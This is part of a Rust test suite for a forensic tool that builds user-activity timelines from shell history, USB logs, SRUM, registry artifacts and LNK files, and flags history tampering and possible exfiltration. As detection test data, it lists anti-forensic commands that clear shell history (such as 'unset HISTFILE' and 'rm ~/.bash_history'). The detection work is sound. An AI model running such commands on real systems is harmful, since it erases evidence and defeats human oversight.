            volume_guid: None,
            drive_letter: None,
            volume_serial: vol,
            disk_signature: None,
            dma_capable: bus.is_dma_capable(),
            mitre: Vec::new(),
            source: Provenance {
                file: "setupapi.dev.log".to_string(),
                line: 1,
            },
        }
    }

    // ── from_shell_history ────────────────────────────────────────────────────

    #[test]
    fn shell_command_becomes_executed_activity() {
        let entries = [entry("ls -la /tmp", Some(1_700_000_000))];
        let acts = from_shell_history(&entries, None);
        assert_eq!(acts.len(), 1);
        assert_eq!(acts[0].action, Action::Executed);
        assert_eq!(acts[0].source, SourceKind::ShellHistory);
        assert_eq!(acts[0].timestamp, Some(1_700_000_000));
        assert_eq!(acts[0].subject, Subject::Command("ls -la /tmp".to_string()));
        assert_eq!(acts[0].actor, None);
    }

    #[test]
    fn shell_actor_is_carried_when_known() {
        let entries = [entry("whoami", None)];
        let acts = from_shell_history(&entries, Some("alice"));
        assert_eq!(acts[0].actor.as_deref(), Some("alice"));
    }

    #[test]
    fn history_clearing_command_becomes_tampered() {
        for cmd in [
            "unset HISTFILE",
            "history -c",
            "export HISTFILE=/dev/null",
            "Clear-History",
            "rm ~/.bash_history",
        ] {
            let entries = [entry(cmd, Some(1))];
            let acts = from_shell_history(&entries, None);
            assert_eq!(acts[0].action, Action::HistoryTampered);
        }
    }

    #[test]
    fn benign_command_is_not_tampered() {
        let entries = [entry("git log --oneline", Some(1))];
        let acts = from_shell_history(&entries, None);
        assert_eq!(acts[0].action, Action::Executed);
    }

    // ── from_device_connections ───────────────────────────────────────────────

    #[test]
    fn device_becomes_connected_with_volume_serial() {
        let conns = [device(
            "USBSTOR\\Disk&Ven_SanDisk\\1234567890AB",
            Bus::Usb,
            Some(1_700_000_500),
            Some(0xDEAD_BEEF),
        )];
        let acts = from_device_connections(&conns);
        assert_eq!(acts.len(), 1);
        assert_eq!(acts[0].action, Action::Connected);
        assert_eq!(acts[0].source, SourceKind::PeripheralDevice);
        assert_eq!(acts[0].timestamp, Some(1_700_000_500));
        assert_eq!(
            acts[0].subject,
            Subject::Device {
                id: "USBSTOR\\Disk&Ven_SanDisk\\1234567890AB".to_string(),
                volume_serial: Some(0xDEAD_BEEF),
            }
        );
    }

    #[test]
    fn device_timestamp_falls_back_through_stamps() {
        let mut conn = device("USB\\VID_0781", Bus::Usb, None, None);
        conn.last_arrival = Some(Stamp::inferred(42));
        let acts = from_device_connections(&[conn]);
        assert_eq!(acts[0].timestamp, Some(42));
    }

    #[test]
    fn device_without_any_stamp_has_no_timestamp() {
        let conn = device("USB\\VID_0781", Bus::Usb, None, None);
        let acts = from_device_connections(&[conn]);
        assert_eq!(acts[0].timestamp, None);
    }

    // ── build_timeline ────────────────────────────────────────────────────────

    #[test]
    fn timeline_merges_and_sorts_by_timestamp() {
        let entries = [entry("late", Some(300)), entry("early", Some(100))];
        let conns = [device("USBSTOR\\x", Bus::Usb, Some(200), None)];
        let shell = ShellHistorySource::new(&entries);
        let devices = DeviceSource::new(&conns);
        let tl = build_timeline(&[&shell, &devices]);
        let ts: Vec<Option<i64>> = tl.iter().map(|e| e.timestamp).collect();
        assert_eq!(ts, vec![Some(100), Some(200), Some(300)]);
    }

    #[test]
    fn timeline_orders_untimestamped_events_last_and_stably() {
        let entries = [
            entry("no_ts_a", None),
            entry("ts", Some(50)),
            entry("no_ts_b", None),
        ];
        let shell = ShellHistorySource::new(&entries);
        let tl = build_timeline(&[&shell]);
        assert_eq!(tl[0].timestamp, Some(50));
        assert_eq!(tl[1].detail, "no_ts_a");
        assert_eq!(tl[2].detail, "no_ts_b");
    }

    // ── audit: USERACT-HISTORY-TAMPERED ───────────────────────────────────────

    #[test]
    fn audit_surfaces_history_tampered() {
        let entries = [entry("unset HISTFILE", Some(10))];
        let acts = from_shell_history(&entries, None);
        let findings = audit(&acts);
        let f = findings
            .iter()
            .find(|f| f.code == "USERACT-HISTORY-TAMPERED")
            .expect("history-tampered finding must fire");
        assert_eq!(f.severity, Some(Severity::Medium));
        assert_eq!(f.category, Category::Concealment);
    }

    // ── audit: USERACT-EXEC-DURING-REMOVABLE-MEDIA ────────────────────────────

    #[test]
    fn audit_fires_exec_during_removable_media_within_window() {
        let entries = [entry("tar czf /media/usb/out.tgz .", Some(1_000))];
        let conns = [device("USBSTOR\\Disk", Bus::Usb, Some(1_500), None)];
        let shell = ShellHistorySource::new(&entries);
        let devices = DeviceSource::new(&conns);
        let tl = build_timeline(&[&shell, &devices]);
        let findings = audit(&tl);
        assert!(findings
            .iter()
            .any(|f| f.code == "USERACT-EXEC-DURING-REMOVABLE-MEDIA"));
    }

    #[test]
    fn audit_does_not_fire_outside_window() {
        let entries = [entry("ls", Some(1_000))];
        let conns = [device(
            "USBSTOR\\Disk",
            Bus::Usb,
            Some(1_000 + REMOVABLE_MEDIA_WINDOW_SECS + 1),
            None,
        )];
        let shell = ShellHistorySource::new(&entries);
        let devices = DeviceSource::new(&conns);
        let tl = build_timeline(&[&shell, &devices]);
        let findings = audit(&tl);
        assert!(findings
            .iter()
            .all(|f| f.code != "USERACT-EXEC-DURING-REMOVABLE-MEDIA"));
    }

    #[test]
    fn audit_does_not_fire_for_non_mass_storage_device() {
        // A Bluetooth HID device is NOT mass storage → no exec-during-media finding.
        let entries = [entry("ls", Some(1_000))];
        let conns = [device("BTHENUM\\Dev", Bus::Bluetooth, Some(1_000), None)];
        let shell = ShellHistorySource::new(&entries);
        let devices = DeviceSource::new(&conns);
        let tl = build_timeline(&[&shell, &devices]);
        let findings = audit(&tl);
        assert!(findings
            .iter()
            .all(|f| f.code != "USERACT-EXEC-DURING-REMOVABLE-MEDIA"));
    }

    #[test]
    fn audit_with_custom_source_stamps_scope() {
        let entries = [entry("history -c", Some(1))];
        let acts = from_shell_history(&entries, None);
        let findings = audit_with(&acts, &source("CASE-001/host-7"));
        let f = &findings[0];
        assert_eq!(f.source.scope, "CASE-001/host-7");
        assert_eq!(f.source.analyzer, "useract-forensic");
    }

    // ── findings are observations, never verdicts ─────────────────────────────

    #[test]
    fn findings_are_hedged_observations_never_verdicts() {
        let entries = [
            entry("unset HISTFILE", Some(1_000)),
            entry("cp x /media/usb", Some(1_010)),
        ];
        let conns = [device("USBSTOR\\Disk", Bus::Usb, Some(1_005), None)];
        let shell = ShellHistorySource::new(&entries);
        let devices = DeviceSource::new(&conns);
        let tl = build_timeline(&[&shell, &devices]);
        let findings = audit(&tl);
        assert!(!findings.is_empty());
        for f in &findings {
            let note = f.note.to_ascii_lowercase();
            assert!(!note.contains("proves"));
            assert!(!note.contains("confirms"));
            assert!(!note.contains("definitely"));
            assert!(note.contains("consistent with"));
        }
    }

    // ── volume-serial join seam (v0.2 activation, proven by construction) ──────

    #[test]
    fn volume_serial_join_is_empty_for_v01_sources() {
        // v0.1 emits no File/Folder subjects carrying a volume serial → no joins.
        let conns = [device("USBSTOR\\Disk", Bus::Usb, Some(1), Some(0x1234))];
        let acts = from_device_connections(&conns);
        assert!(device_file_volume_joins(&acts).is_empty());
    }

    #[test]
    fn volume_serial_join_lights_up_for_a_v02_style_file_event() {
        // A synthetic v0.2-shape File activity advertising the same volume serial as
        // a connected device joins to it — proving the seam is correct by construction.
        let conns = [device("USBSTOR\\Disk", Bus::Usb, Some(1), Some(0x1234))];
        let mut acts = from_device_connections(&conns);
        acts.push(UserActivity {
            timestamp: Some(2),
            actor: None,
            action: Action::Accessed,
            subject: Subject::file("\\\\?\\E:\\secret.docx"),
            source: SourceKind::PeripheralDevice, // placeholder
            detail: "opened E:\\secret.docx vol:4660".to_string(), // 0x1234 == 4660
        });
        let joins = device_file_volume_joins(&acts);
        assert_eq!(joins, vec![(0, 1)]);
    }

    #[test]
    fn volume_serial_join_ignores_mismatched_serials() {
        let conns = [device("USBSTOR\\Disk", Bus::Usb, Some(1), Some(0x1234))];
        let mut acts = from_device_connections(&conns);
        acts.push(UserActivity {
            timestamp: Some(2),
            actor: None,
            action: Action::Accessed,
            subject: Subject::file("x"),
            source: SourceKind::PeripheralDevice,
            detail: "vol:9999".to_string(),
        });
        assert!(device_file_volume_joins(&acts).is_empty());
    }

    #[test]
    fn volume_serial_join_skips_files_without_a_volume_token() {
        // A folder activity that advertises no `vol:` token never joins (the
        // file_volume_serial None path).
        let conns = [device("USBSTOR\\Disk", Bus::Usb, Some(1), Some(0x1234))];
        let mut acts = from_device_connections(&conns);
        acts.push(UserActivity {
            timestamp: Some(2),
            actor: None,
            action: Action::Accessed,
            subject: Subject::folder("E:\\photos"),
            source: SourceKind::PeripheralDevice,
            detail: "opened folder with no serial hint".to_string(),
        });
        // And a file whose `vol:` token is non-numeric (parse Err path) also never joins.
        acts.push(UserActivity {
            timestamp: Some(3),
            actor: None,
            action: Action::Accessed,
            subject: Subject::file("E:\\x"),
            source: SourceKind::PeripheralDevice,
            detail: "vol:notanumber".to_string(),
        });
        assert!(device_file_volume_joins(&acts).is_empty());
    }

    #[test]
    fn history_tampered_finding_falls_back_to_detail_for_non_command_subject() {
        // Defensive: a HistoryTampered activity whose subject is not a Command still
        // produces a finding, using detail for the command text.
        let act = UserActivity {
            timestamp: Some(1),
            actor: None,
            action: Action::HistoryTampered,
            subject: Subject::file("ConsoleHost_history.txt"),
            source: SourceKind::ShellHistory,
            detail: "Remove-Item ConsoleHost_history.txt".to_string(),
        };
        let findings = audit(&[act]);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].code, "USERACT-HISTORY-TAMPERED");
        assert!(findings[0]
            .note
            .contains("Remove-Item ConsoleHost_history.txt"));
    }

    #[test]
    fn is_mass_storage_id_classifies_bare_and_separated_ids() {
        assert!(is_mass_storage_id("USBSTOR\\Disk&Ven"));
        assert!(is_mass_storage_id("USBSTOR"));
        assert!(!is_mass_storage_id("BTHENUM\\Dev"));
        assert!(!is_mass_storage_id(""));
    }

    #[test]
    fn activitysource_trait_dispatches() {
        let entries = [entry("ls", Some(1))];
        let s = ShellHistorySource::for_actor(&entries, "bob");
        let acts: Vec<UserActivity> = s.activities();
        assert_eq!(acts[0].actor.as_deref(), Some("bob"));
    }

    // ── SRUM adapter (v0.2) ───────────────────────────────────────────────────

    use srum_core::{AppUsageRecord, IdMapEntry, NetworkUsageRecord};

    fn utc(epoch: i64) -> chrono::DateTime<chrono::Utc> {
        chrono::DateTime::from_timestamp(epoch, 0).expect("valid epoch")
    }

    #[test]
    fn srum_network_row_is_executed_and_actor_attributed() {
        // user_id and app_id are integers resolved through the id-map.
        let id_map = [
            IdMapEntry {
                id: 7,
                name: "S-1-5-21-1-2-3-1001".to_string(),
            },
            IdMapEntry {
                id: 42,
                name: "\\Device\\HarddiskVolume3\\Windows\\explorer.exe".to_string(),
            },
        ];
        let net = [NetworkUsageRecord {
            app_id: 42,
            user_id: 7,
            timestamp: utc(1_700_000_000),
            bytes_sent: 4096,
            bytes_recv: 1024,
            auto_inc_id: 0,
        }];
        let acts = from_srum(&net, &[], &id_map);
        assert_eq!(acts.len(), 1);
        let a = &acts[0];
        assert_eq!(a.action, Action::Executed);
        assert_eq!(a.source, SourceKind::Srum);
        assert_eq!(a.timestamp, Some(1_700_000_000));
        // First source that ATTRIBUTES to a specific user SID.
        assert_eq!(a.actor.as_deref(), Some("S-1-5-21-1-2-3-1001"));
        // App resolves through the id-map.
        assert_eq!(
            a.subject,
            Subject::Command("\\Device\\HarddiskVolume3\\Windows\\explorer.exe".to_string())
        );
        // Network volume surfaced in the detail.
        assert!(a.detail.contains("4096"));
        assert!(a.detail.contains("1024"));
    }

    #[test]
    fn srum_unresolved_user_id_falls_back_to_numeric_token() {
        // No id-map entry for the user → actor is a stable synthetic token, never lost.
        let net = [NetworkUsageRecord {
            app_id: 1,
            user_id: 99,
            timestamp: utc(10),
            bytes_sent: 1,
            bytes_recv: 2,
            auto_inc_id: 0,
        }];
        let acts = from_srum(&net, &[], &[]);
        assert_eq!(acts.len(), 1);
        assert_eq!(acts[0].actor.as_deref(), Some("user-id:99"));
        // App also falls back when unresolved.
        assert_eq!(acts[0].subject, Subject::Command("app-id:1".to_string()));
    }

    #[test]
    fn srum_app_usage_row_is_executed_and_actor_attributed() {
        let id_map = [
            IdMapEntry {
                id: 5,
                name: "S-1-5-21-9-9-9-500".to_string(),
            },
            IdMapEntry {
                id: 8,
                name: "C:\\Tools\\rclone.exe".to_string(),
            },
        ];
        let app = [AppUsageRecord {
            app_id: 8,
            user_id: 5,
            timestamp: utc(1_700_000_500),
            foreground_cycles: 900_000,
            background_cycles: 100,
            auto_inc_id: 0,
        }];
        let acts = from_srum(&[], &app, &id_map);
        assert_eq!(acts.len(), 1);
        assert_eq!(acts[0].action, Action::Executed);
        assert_eq!(acts[0].source, SourceKind::Srum);
        assert_eq!(acts[0].actor.as_deref(), Some("S-1-5-21-9-9-9-500"));
        assert_eq!(
            acts[0].subject,
            Subject::Command("C:\\Tools\\rclone.exe".to_string())
        );
    }

    #[test]
    fn srum_source_adapter_dispatches() {
        let net = [NetworkUsageRecord {
            app_id: 1,
            user_id: 1,
            timestamp: utc(1),
            bytes_sent: 1,
            bytes_recv: 1,
            auto_inc_id: 0,
        }];
        let s = SrumSource::new(&net, &[], &[]);
        let acts = s.activities();
        assert_eq!(acts.len(), 1);
        assert_eq!(acts[0].source, SourceKind::Srum);
    }

    // ── audit: USERACT-NETWORK-EXFIL-VOLUME (v0.2) ────────────────────────────

    #[test]
    fn audit_fires_network_exfil_volume_above_threshold() {
        let id_map = [
            IdMapEntry {
                id: 7,
                name: "S-1-5-21-1-2-3-1001".to_string(),
            },
            IdMapEntry {
                id: 42,
                name: "rclone.exe".to_string(),
            },
        ];
        let net = [NetworkUsageRecord {
            app_id: 42,
            user_id: 7,
            timestamp: utc(1_700_000_000),
            bytes_sent: NETWORK_EXFIL_BYTES_THRESHOLD + 1,
            bytes_recv: 0,
            auto_inc_id: 0,
        }];
        let acts = from_srum(&net, &[], &id_map);
        let findings = audit(&acts);
        let f = findings
            .iter()
            .find(|f| f.code == "USERACT-NETWORK-EXFIL-VOLUME")
            .expect("network-exfil-volume must fire above threshold");
        assert_eq!(f.severity, Some(Severity::Medium));
        assert_eq!(f.category, Category::Threat);
    }

    #[test]
    fn audit_does_not_fire_network_exfil_below_threshold() {
        let net = [NetworkUsageRecord {
            app_id: 1,
            user_id: 1,
            timestamp: utc(1),
            bytes_sent: NETWORK_EXFIL_BYTES_THRESHOLD - 1,
            bytes_recv: 0,
            auto_inc_id: 0,
        }];
        let acts = from_srum(&net, &[], &[]);
        let findings = audit(&acts);
        assert!(findings
            .iter()
            .all(|f| f.code != "USERACT-NETWORK-EXFIL-VOLUME"));
    }

    #[test]
    fn audit_skips_exfil_check_for_srum_app_usage_rows() {
        // An app-usage SRUM row carries CPU cycles, not bytes, so its detail has no
        // bytes-sent prefix: the exfil check sees None and never fires (regardless
        // of how large the cycle counts are).
        let app = [AppUsageRecord {
            app_id: 1,
            user_id: 1,
            timestamp: utc(1),
            foreground_cycles: u64::MAX,
            background_cycles: u64::MAX,
            auto_inc_id: 0,
        }];
        let acts = from_srum(&[], &app, &[]);
        let findings = audit(&acts);
        assert!(findings
            .iter()
            .all(|f| f.code != "USERACT-NETWORK-EXFIL-VOLUME"));
    }

    // ── winreg-artifacts adapter (v0.2) ───────────────────────────────────────

    use winreg_artifacts::shellbags::ShellbagEntry;
    use winreg_artifacts::typed_urls::TypedUrl;
    use winreg_artifacts::userassist::UserAssistEntry;

    fn ua(program: &str, run_count: u32, last_run: Option<&str>) -> UserAssistEntry {
        UserAssistEntry {
            program: program.to_string(),
            run_count,
            focus_count: 0,
            focus_duration_ms: 0,
            last_run: last_run.map(ToString::to_string),
            guid: "{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}".to_string(),
        }
    }

    #[test]
    fn userassist_entry_becomes_executed_with_run_count() {
        let entries = [ua(
            "C:\\Windows\\System32\\cmd.exe",
            5,
            Some("2024-06-15T08:00:00Z"),
        )];
        let acts = from_userassist(&entries, Some("alice"));
        assert_eq!(acts.len(), 1);
        let a = &acts[0];
        assert_eq!(a.action, Action::Executed);
        assert_eq!(a.source, SourceKind::Registry);
        assert_eq!(
            a.subject,
            Subject::Command("C:\\Windows\\System32\\cmd.exe".to_string())
        );
        // ISO last_run is parsed to epoch (2024-06-15T08:00:00Z = 1718438400).
        assert_eq!(a.timestamp, Some(1_718_438_400));
        assert_eq!(a.actor.as_deref(), Some("alice"));
        // Run count carried in detail.
        assert!(a.detail.contains('5'));
    }

    #[test]
    fn userassist_without_last_run_has_no_timestamp() {
        let entries = [ua("notepad.exe", 1, None)];
        let acts = from_userassist(&entries, None);
        assert_eq!(acts[0].timestamp, None);
        assert_eq!(acts[0].actor, None);
    }

    #[test]
    fn typed_url_becomes_typed_activity() {
        let urls = [TypedUrl {
            url: "https://pastebin.com/abc".to_string(),
            last_visited: Some("2024-01-02T03:04:05Z".to_string()),
            is_suspicious: true,
            suspicious_reason: Some("suspicious domain: pastebin.com".to_string()),
        }];
        let acts = from_typed_urls(&urls, None);
        assert_eq!(acts.len(), 1);
        assert_eq!(acts[0].action, Action::Typed);
        assert_eq!(acts[0].source, SourceKind::Registry);
        assert_eq!(
            acts[0].subject,
            Subject::Query("https://pastebin.com/abc".to_string())
        );
        assert!(acts[0].timestamp.is_some());
    }

    #[test]
    fn shellbag_becomes_accessed_folder() {
        let bags = [ShellbagEntry {
            path: "BagMRU[slot=0, size=120 bytes]".to_string(),
            key_path: "Software\\Microsoft\\Windows\\Shell\\BagMRU\\0".to_string(),
            last_written: Some("2024-03-04T05:06:07Z".to_string()),
            mru_order: vec!["0".to_string()],
        }];
        let acts = from_shellbags(&bags, Some("bob"));
        assert_eq!(acts.len(), 1);
        assert_eq!(acts[0].action, Action::Accessed);
        assert_eq!(acts[0].source, SourceKind::Registry);
        assert!(matches!(acts[0].subject, Subject::Folder { .. }));
        assert_eq!(acts[0].actor.as_deref(), Some("bob"));
    }

    #[test]
    fn from_registry_merges_all_three_registry_artifacts() {
        let ua_entries = [ua("cmd.exe", 1, Some("2024-06-15T08:00:00Z"))];
        let urls = [TypedUrl {
            url: "https://x.test".to_string(),
            last_visited: None,
            is_suspicious: false,
            suspicious_reason: None,
        }];
        let bags = [ShellbagEntry {
            path: "BagMRU[slot=0, size=10 bytes]".to_string(),
            key_path: "k".to_string(),
            last_written: None,
            mru_order: vec![],
        }];
        let acts = from_registry(&ua_entries, &urls, &bags, Some("alice"));
        assert_eq!(acts.len(), 3);
        assert!(acts.iter().any(|a| a.action == Action::Executed));
        assert!(acts.iter().any(|a| a.action == Action::Typed));
        assert!(acts.iter().any(|a| a.action == Action::Accessed));
        assert!(acts.iter().all(|a| a.source == SourceKind::Registry));
        assert!(acts.iter().all(|a| a.actor.as_deref() == Some("alice")));
    }

    #[test]
    fn registry_source_adapter_dispatches() {
        let ua_entries = [ua("cmd.exe", 1, None)];
        let s = RegistrySource::new(&ua_entries, &[], &[], None);
        let acts = s.activities();
        assert_eq!(acts.len(), 1);
        assert_eq!(acts[0].source, SourceKind::Registry);
    }

    // ── LNK adapter (v0.2) ────────────────────────────────────────────────────

    use lnk_core::{LinkInfo, ShellLink, ShellLinkHeader, StringData, VolumeId};

    fn shell_link(
        local_base_path: Option<&str>,
        drive_serial: Option<u32>,
        write_time: i64,
        net_name: Option<&str>,
    ) -> ShellLink {
        let volume_id = drive_serial.map(|s| VolumeId {
            drive_type: lnk_core::drive_type::REMOVABLE,
            drive_serial_number: s,
            volume_label: None,
        });
        let cnrl = net_name.map(|n| lnk_core::CommonNetworkRelativeLink {
            net_name: Some(n.to_string()),
            device_name: None,
        });
        ShellLink {
            header: ShellLinkHeader {
                link_flags: 0,
                file_attributes: 0,
                creation_time: 0,
                access_time: 0,
                write_time,
                file_size: 0,
                icon_index: 0,
                show_command: 1,
                hotkey: 0,
            },
            link_target_idlist: None,
            link_info: Some(LinkInfo {
                volume_id,
                local_base_path: local_base_path.map(ToString::to_string),
                common_network_relative_link: cnrl,
            }),
            string_data: StringData::default(),
            tracker: None,
        }
    }

    #[test]
    fn lnk_target_becomes_accessed_file_with_volume_serial() {
        let links = [shell_link(
            Some("E:\\secret.docx"),
            Some(0xDEAD_BEEF),
            1_700_000_000,
            None,
        )];
        let acts = from_lnk(&links, Some("alice"));
        assert_eq!(acts.len(), 1);
        let a = &acts[0];
        assert_eq!(a.action, Action::Accessed);
        assert_eq!(a.source, SourceKind::LnkFile);
        // The target write time becomes the activity timestamp.
        assert_eq!(a.timestamp, Some(1_700_000_000));
        assert_eq!(a.actor.as_deref(), Some("alice"));
        // The File subject carries the structured volume serial (the join key).
        assert_eq!(
            a.subject,
            Subject::File {
                path: "E:\\secret.docx".to_string(),
                volume_serial: Some(0xDEAD_BEEF),
            }
        );
    }

    #[test]
    fn lnk_without_volume_id_has_no_serial() {
        let links = [shell_link(Some("C:\\x.txt"), None, 0, None)];
        let acts = from_lnk(&links, None);
        assert_eq!(acts.len(), 1);
        assert_eq!(
            acts[0].subject,
            Subject::File {
                path: "C:\\x.txt".to_string(),
                volume_serial: None,
            }
        );
        // write_time 0 (the FILETIME "not set" sentinel) → no timestamp.
        assert_eq!(acts[0].timestamp, None);
    }

    #[test]
    fn lnk_network_target_falls_back_to_unc_path() {
        // No local_base_path, but a CommonNetworkRelativeLink net name → use it.
        let links = [shell_link(None, None, 5, Some("\\\\server\\share"))];
        let acts = from_lnk(&links, None);
        assert_eq!(acts.len(), 1);
        assert_eq!(
            acts[0].subject,
            Subject::File {
                path: "\\\\server\\share".to_string(),
                volume_serial: None,
            }
        );
    }

    #[test]
    fn lnk_without_link_info_is_skipped() {
        // A link with no LinkInfo and no usable target is dropped, not crashed.
        let mut link = shell_link(None, None, 0, None);
        link.link_info = None;
        let acts = from_lnk(&[link], None);
        assert!(acts.is_empty());
    }

    #[test]
    fn lnk_source_adapter_dispatches() {
        let links = [shell_link(Some("E:\\f"), Some(1), 1, None)];
        let s = LnkSource::new(&links, None);
        let acts = s.activities();
        assert_eq!(acts.len(), 1);
        assert_eq!(acts[0].source, SourceKind::LnkFile);
    }

    // ── The volume-serial join activates end-to-end (LNK File ⋈ Device) ───────

    #[test]
    fn lnk_file_joins_connected_device_on_volume_serial() {
        let links = [shell_link(
            Some("E:\\loot.zip"),
            Some(0xCAFE_F00D),
            100,
            None,
        )];
        let conns = [device(
            "USBSTOR\\Disk",
            Bus::Usb,
            Some(50),
            Some(0xCAFE_F00D),
        )];
        let lnk = LnkSource::new(&links, Some("alice"));
        let devices = DeviceSource::new(&conns);
        let timeline = build_timeline(&[&lnk, &devices]);
        let findings = audit(&timeline);
        let f = findings
            .iter()
            .find(|f| f.code == "USERACT-FILE-ON-EXTERNAL-DEVICE")
            .expect("file-on-external-device must fire when serials match");
        assert_eq!(f.severity, Some(Severity::Medium));
        assert_eq!(f.category, Category::Threat);
    }
}
